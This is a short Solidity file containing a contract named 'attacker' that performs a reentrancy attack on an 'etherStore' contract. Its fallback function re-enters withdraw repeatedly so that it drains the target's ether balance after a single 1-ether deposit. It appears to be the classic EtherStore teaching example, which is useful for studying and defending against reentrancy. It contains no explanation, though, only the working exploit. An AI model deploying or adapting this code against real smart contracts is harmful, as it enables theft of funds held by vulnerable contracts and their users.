//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface etherStore{
    function deposit() external payable;
    function withdraw(uint256) external payable;
}


contract attacker{
    etherStore public EtherStore;
    address public etherStoreAddress;

    constructor(address _etherStoreAddress) public {
        etherStoreAddress = _etherStoreAddress;
        EtherStore = etherStore(etherStoreAddress);
    }

    fallback() external payable{
        if(address(EtherStore).balance >= 1){
            EtherStore.withdraw(1 ether);
        }
    }

    function attack() public payable{
        EtherStore.deposit{value: 1 ether}();
        EtherStore.withdraw(1 ether);
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
}